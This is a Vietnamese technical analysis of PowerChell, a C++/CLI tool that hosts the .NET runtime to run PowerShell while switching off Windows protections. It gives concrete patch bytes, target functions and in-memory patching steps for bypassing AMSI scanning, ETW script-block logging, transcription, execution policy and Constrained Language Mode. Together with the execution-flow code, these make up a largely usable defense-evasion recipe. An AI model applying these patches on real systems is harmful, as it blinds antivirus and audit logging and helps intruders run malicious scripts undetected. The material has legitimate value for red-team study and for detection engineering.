# PowerChell - Phân tích kỹ thuật

## Mục lục

1. [Tổng quan](#tổng-quan)
2. [Kiến trúc project](#kiến-trúc-project)
3. [CLR Hosting - Gọi .NET từ Native C++](#clr-hosting---gọi-net-từ-native-c)
4. [Các kỹ thuật Bypass](#các-kỹ-thuật-bypass)
   - [1. AMSI Bypass](#1-amsi-bypass)
   - [2. ETW Bypass](#2-etw-bypass)
   - [3. Transcription Bypass](#3-transcription-bypass)
   - [4. Execution Policy Bypass](#4-execution-policy-bypass)
   - [5. Constrained Language Mode Bypass](#5-constrained-language-mode-bypass)
5. [Luồng thực thi](#luồng-thực-thi)
6. [Cấu trúc file](#cấu-trúc-file)
7. [Phụ lục: Cấu trúc code](#phụ-lục-cấu-trúc-code)

---

## Tổng quan

**PowerChell** là một project C++/CLI cho phép thực thi PowerShell từ code native C++ đồng thời bypass nhiều cơ chế bảo mật của Windows:

| Cơ chế bảo mật | Mục đích | Kỹ thuật bypass |
|----------------|----------|------------------|
| **AMSI** | Anti-Malware Scan Interface - quét script trước khi thực thi | Patch `AmsiOpenSession` và `AmsiScanBuffer` |
| **ETW** | Event Tracing for Windows - ghi log hoạt động PowerShell | Patch `PSEtwLogProvider.etwProvider.m_enabled` |
| **Transcription** | Ghi lại lịch sử lệnh PowerShell | Patch `TranscriptionOption.FlushContentToDisk` |
| **Execution Policy** | Ngăn thực thi script không được ký | Patch `AuthorizationManager.ShouldRunInternal` |
| **Constrained Language** | Giới hạn ngôn ngữ PowerShell | Patch `SystemPolicy.GetSystemLockdownPolicy` |

---

## Kiến trúc project

```
Powershell/
├── clr.h / clr.cpp       # CLR Hosting - Quản lý .NET Runtime
├── common.h              # Macro debug và utility
├── patch.h / patch.cpp   # Các hàm patch bảo mật
├── powershell.h          # Interface PowerShell
└── powershell.cpp        # Implement PowerShell API
```

### Dependencies

- **mscoree.lib** - CLR Hosting API
- **Propsys.lib** - Property Variant utilities
- **mscorlib.tlb** - .NET Framework Type Library (imported via `#import`)

---

## CLR Hosting - Gọi .NET từ Native C++

### 1. Khởi tạo CLR

```cpp
BOOL clr::InitializeCommonLanguageRuntime(PCLR_CONTEXT pClrContext, mscorlib::_AppDomain** ppAppDomain)
```

**Luồng hoạt động:**

```
1. CLRCreateInstance(CLSID_CLRMetaHost)
         ↓
2. ICLRMetaHost->GetRuntime("v4.0.30319")
         ↓
3. ICLRRuntimeInfo->IsLoadable()
         ↓
4. ICLRRuntimeInfo->GetInterface(CLSID_CorRuntimeHost)
         ↓
5. ICorRuntimeHost->Start()
         ↓
6. ICorRuntimeHost->CreateDomain(APP_DOMAIN)
         ↓
7. QueryInterface -> _AppDomain*
```

**Ý nghĩa:**
- Host CLR vào process hiện tại
- Tạo AppDomain riêng "PowerChell"
- Cho phép load và thao tác với .NET assemblies

### 2. Load Assembly và Type

```cpp
BOOL clr::LoadAssembly(...)    // Tìm và load .NET assembly
BOOL clr::GetType(...)        // Lấy type từ assembly
BOOL clr::GetMethod(...)       // Lấy method info
BOOL clr::InvokeMethod(...)    // Gọi method
```

**Assembly được sử dụng:**

| Assembly | Mục đích |
|----------|----------|
| `System.Core` | EventProvider, reflection |
| `System.Reflection` | MethodInfo, PropertyInfo |
| `System.Runtime` | RuntimeHelpers, Type, Exception |
| `Microsoft.PowerShell.ConsoleHost` | Console shell entry point |
| `System.Management.Automation` | PowerShell API |

### 3. JIT Compilation và Function Pointer

```cpp
BOOL clr::GetJustInTimeMethodAddress(...)
```

Kỹ thuật quan trọng để patch managed code:

```
1. GetMethod() -> _MethodInfo*
         ↓
2. Get Property "MethodHandle" từ MethodInfo
         ↓
3. RuntimeHelpers.PrepareMethod(MethodHandle)
         ↓
4. RuntimeMethodHandle.GetFunctionPointer()
         ↓
5. Raw function pointer (ULONG_PTR)
```

Đây là kỹ thuật từ bài blog [Unmanaged DotNET Patching](https://www.outflank.nl/blog/2024/02/01/unmanaged-dotnet-patching/).

---

## Các kỹ thuật Bypass

### 1. AMSI Bypass

**AMSI (Anti-Malware Scan Interface)** là API cho phép Windows Defender và AV scan content trước khi thực thi.

#### Patch AmsiOpenSession

```cpp
BOOL PatchAmsiOpenSession()
{
    // Patch: JZ -> JMP (byte 0x74 -> 0xeb)
    BYTE bPatch[] = { 0xeb };
    
    return PatchUnmanagedFunction(
        L"amsi",
        "AmsiOpenSession",
        bPatch,
        1,
        3  // Offset: thay JZ bằng JMP
    );
}
```

**Giải thích:**

```
Trước patch:
┌─────────────────────────────────────┐
│ 48 85 D2      TEST RDX,RDX         │ <- Kiểm tra null
│ 74 0C         JZ short loc_xxx      │ <- Nhảy nếu null
│ B8 57 00 07 80 MOV EAX,80070057    │ <- Return error
│ C3            RET                  │
└─────────────────────────────────────┘

Sau patch:
┌─────────────────────────────────────┐
│ 48 85 D2      TEST RDX,RDX         │
│ EB 0C         JMP short loc_xxx    │ <- Luôn nhảy (bypass)
│ B8 57 00 07 80 MOV EAX,80070057    │
│ C3            RET                  │
└─────────────────────────────────────┘
```

#### Patch AmsiScanBuffer

```cpp
BOOL PatchAmsiScanBuffer()
{
    // Pattern: mov edi, r8d (copy buffer length)
    BYTE bPattern[] = { 0x41, 0x8b, 0xf8 };
    // Patch: xor rdi, rdi (set length = 0)
    BYTE bPatch[] = { 0x48, 0x31, 0xff };
    
    // Tìm offset của pattern trong hàm
    FindBufferOffset(..., &dwPatternOffset);
    
    // Patch tại offset đó
    PatchUnmanagedFunction(..., dwPatternOffset);
}
```

**Giải thích:**

```
AmsiScanBuffer nhận tham số:
  - Buffer address (rsi)
  - Buffer length (rdi/r8d)
  - Content type

Patch thay đổi:
  MOV EDI, R8D    →    XOR RDI, RDI
  (copy length)       (set length = 0)

Kết quả: AMSI scan một buffer có length = 0 → luôn "sạch"
```

**Reference:** [Nuke-AMSI](https://github.com/anonymous300502/Nuke-AMSI)

---

### 2. ETW Bypass

**ETW (Event Tracing for Windows)** ghi log PowerShell activity bao gồm Script Block Logging.

```cpp
BOOL DisablePowerShellEtwProvider(mscorlib::_AppDomain* pAppDomain)
{
    // 1. Lấy type PSEtwLogProvider
    GetType("System.Management.Automation.Tracing.PSEtwLogProvider")
         ↓
    // 2. Đọc static field "etwProvider"
    GetFieldValue("etwProvider")
         ↓
    // 3. Lấy type EventProvider
    GetType("System.Diagnostics.Eventing.EventProvider")
         ↓
    // 4. Patch instance field "m_enabled" = 0
    FieldInfo->SetValue(vtPsEtwLogProviderInstance, 0)
}
```

**Cấu trúc internal:**

```
PSEtwLogProvider (class)
├── etwProvider: EventProvider (static)
│   └── m_enabled: bool (instance, offset 0xbc)
│       └── Khi = 0: Không log gì cả
```

**Ảnh hưởng:**
- Tắt Script Block Logging
- Tắt Module Logging
- Tắt Pipeline Execution Details

**Reference:** [Disable ETW provider technique](https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32)

---

### 3. Transcription Bypass

**Transcription** ghi lại input/output của PowerShell ra file.

```cpp
BOOL PatchTranscriptionOptionFlushContentToDisk(mscorlib::_AppDomain* pAppDomain)
{
    BYTE bPatch[] = { 0xc3 }; // RET
    
    return PatchManagedFunction(
        pAppDomain,
        L"System.Management.Automation",
        L"System.Management.Automation.Host.TranscriptionOption",
        L"FlushContentToDisk",
        0,      // 0 arguments
        bPatch,
        1,      // 1 byte (RET)
        0       // offset 0
    );
}
```

**Giải thích:**

```
TranscriptionOption.FlushContentToDisk()
{
    // Write to transcript file...
}

Sau patch:
TranscriptionOption.FlushContentToDisk()
{
    RET  // Return immediately, write nothing
}
```

**Reference:** [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell)

---

### 4. Execution Policy Bypass

**Execution Policy** kiểm tra script có được ký hay không trước khi thực thi.

```cpp
BOOL PatchAuthorizationManagerShouldRunInternal(mscorlib::_AppDomain* pAppDomain)
{
    BYTE bPatch[] = { 0xc3 }; // RET
    
    return PatchManagedFunction(
        pAppDomain,
        L"System.Management.Automation",
        L"System.Management.Automation.AuthorizationManager",
        L"ShouldRunInternal",
        3,      // 3 arguments
        bPatch,
        1,
        0
    );
}
```

**Giải thích:**

```
AuthorizationManager.ShouldRunInternal(filePath, signature, ...)
{
    if (/* policy check fails */)
        throw UnauthorizedAccessException;  // Blocked!
}

Sau patch:
AuthorizationManager.ShouldRunInternal(...)
{
    RET  // Return immediately, throw nothing
}
```

**Reference:** [NetSPI - 15 ways to bypass PowerShell Execution Policy](https://www.netspi.com/blog/technical-blog/network-pentesting/15-ways-to-bypass-the-powershell-execution-policy/)

---

### 5. Constrained Language Mode Bypass

**Constrained Language Mode** giới hạn PowerShell chỉ dùng approved cmdlets (thường trong WDAC/JIT policies).

```cpp
BOOL PatchSystemPolicyGetSystemLockdownPolicy(mscorlib::_AppDomain* pAppDomain)
{
    // xor rax, rax; ret (return 0 = SystemEnforcementMode.None)
    BYTE bPatch[] = { 0x48, 0x31, 0xc0, 0xc3 };
    
    return PatchManagedFunction(
        pAppDomain,
        L"System.Management.Automation",
        L"System.Management.Automation.Security.SystemPolicy",
        L"GetSystemLockdownPolicy",
        0,
        bPatch,
        4,
        0
    );
}
```

**Giải thích:**

```
SystemPolicy.GetSystemLockdownPolicy()
{
    // Read from registry/GPO
    return SystemEnforcementMode.Enforcement;  // Constrained
}

Sau patch:
SystemPolicy.GetSystemLockdownPolicy()
{
    XOR RAX, RAX    // RAX = 0
    RET             // Return 0 = None (Full Language Mode)
}
```

**Reference:** [Bypass CLM](https://github.com/calebstewart/bypass-clm)

---

## Luồng thực thi

### Mode 1: Interactive Console

```cpp
void CreatePowerShellConsole()
{
    // 1. Initialize CLR
    clr::InitializeCommonLanguageRuntime(&cc, &pAppDomain);
    
    // 2. Create RunspaceConfiguration
    CreateInitialRunspaceConfiguration(pAppDomain, &vtConfig);
    
    // 3. Patch all the things
    PatchAllTheThings(pAppDomain);
    
    // 4. Start PowerShell console
    StartConsoleShell(pAppDomain, vtConfig, banner, help, args);
    
    // Cleanup on exit
    clr::DestroyCommonLanguageRuntime(&cc, pAppDomain);
}
```

### Mode 2: Execute Script

```cpp
void ExecutePowerShellScript(LPWSTR pwszScript)
{
    // 1. Initialize CLR
    clr::InitializeCommonLanguageRuntime(&cc, &pAppDomain);
    
    // 2. Create PowerShell instance
    PowerShellCreate(pAppDomain, &vtPowerShell);
    
    // 3. Add script
    PowerShellAddScript(pAppDomain, vtPowerShell, pwszScript);
    
    // 4. Add Out-String command
    PowerShellAddCommand(pAppDomain, vtPowerShell, L"Out-String");
    
    // 5. Patch security
    PatchAllTheThings(pAppDomain);
    
    // 6. Invoke
    PowerShellInvoke(pAppDomain, vtPowerShell, &vtResult);
    
    // 7. Print results
    PrintPowerShellInvokeResult(pAppDomain, vtResult);
    PrintPowerShellInvokeInformation(pAppDomain, vtPowerShell);
    
    // 8. Check and print errors
    if (PowerShellHadErrors(pAppDomain, vtPowerShell, &bHadErrors))
        PrintPowerShellInvokeErrors(pAppDomain, vtPowerShell);
}
```

---

## Cấu trúc file

### clr.h / clr.cpp

| Hàm | Mô tả |
|-----|-------|
| `InitializeCommonLanguageRuntime` | Khởi tạo CLR 4.0 |
| `DestroyCommonLanguageRuntime` | Cleanup resources |
| `FindAssemblyPath` | Tìm assembly trong GAC |
| `GetAssembly` | Lấy assembly đã load |
| `LoadAssembly` | Load assembly mới |
| `GetType` | Lấy type info |
| `GetMethod` | Lấy method info |
| `InvokeMethod` | Gọi .NET method |
| `GetJustInTimeMethodAddress` | Lấy raw function pointer |

### patch.h / patch.cpp

| Hàm | Mô tả |
|-----|-------|
| `PatchAmsiOpenSession` | Patch AMSI session |
| `PatchAmsiScanBuffer` | Patch AMSI scan |
| `PatchSystemPolicyGetSystemLockdownPolicy` | Patch CLM |
| `PatchTranscriptionOptionFlushContentToDisk` | Patch transcription |
| `PatchAuthorizationManagerShouldRunInternal` | Patch execution policy |
| `PatchManagedFunction` | Generic managed patch |
| `PatchUnmanagedFunction` | Generic unmanaged patch |
| `FindBufferOffset` | Tìm pattern trong memory |

### powershell.h / powershell.cpp

| Hàm | Mô tả |
|-----|-------|
| `CreatePowerShellConsole` | Tạo interactive shell |
| `ExecutePowerShellScript` | Thực thi script |
| `DisablePowerShellEtwProvider` | Tắt ETW logging |
| `PatchAllTheThings` | Apply tất cả patches |
| `PowerShellCreate/AddScript/Invoke` | PowerShell API |
| `PrintPowerShellInvoke*` | In kết quả/errors |

---

## Phụ lục: Cấu trúc code

### Macro Debug

```cpp
#define PRINT_INFO(f, ...)    wprintf(L"[*] " f, __VA_ARGS__);
#define PRINT_WARNING(f, ...) wprintf(L"[!] " f, __VA_ARGS__);
#define PRINT_ERROR(f, ...)   wprintf(L"[-] " f, __VA_ARGS__);

#define EXIT_ON_NULL_POINTER(m, p)     if (p == NULL) { PRINT_ERROR(...); goto exit; }
#define EXIT_ON_WIN32_ERROR(f, c)     if (c) { PRINT_ERROR(...); goto exit; }
#define EXIT_ON_HRESULT_ERROR(f, hr)  if (FAILED(hr)) { PRINT_ERROR(...); goto exit; }
```

### Binding Flags

```cpp
#define BINDING_FLAGS_PUBLIC_STATIC     Public | Static
#define BINDING_FLAGS_PUBLIC_INSTANCE    Public | Instance
#define BINDING_FLAGS_NONPUBLIC_STATIC   NonPublic | Static
#define BINDING_FLAGS_NONPUBLIC_INSTANCE NonPublic | Instance
```

### Patch Mechanism

```
PatchManagedFunction(AppDomain, Assembly, Class, Method, Args, PatchBytes, Size, Offset)
         ↓
    GetJustInTimeMethodAddress(...) → pMethodAddress
         ↓
    pMethodAddress += Offset
         ↓
    VirtualProtect(PAGE_EXECUTE_READWRITE)
         ↓
    memcpy(PatchBytes) → memory
         ↓
    VirtualProtect(restore original)
         ↓
    Done! Function patched in-place
```

---

## Tài liệu tham khảo

1. [Nuke-AMSI](https://github.com/anonymous300502/Nuke-AMSI)
2. [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell)
3. [Bypass CLM](https://github.com/calebstewart/bypass-clm)
4. [NetSPI Execution Policy Bypass](https://www.netspi.com/blog/technical-blog/network-pentesting/15-ways-to-bypass-the-powershell-execution-policy/)
5. [Unmanaged DotNET Patching](https://www.outflank.nl/blog/2024/02/01/unmanaged-dotnet-patching/)
6. [Disable ETW Provider](https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32)
7. [Massaging your CLR](https://www.mdsec.co.uk/2020/08/massaging-your-clr-preventing-environment-exit-in-in-process-net-assemblies/)

---

*Document generated: August 2026*
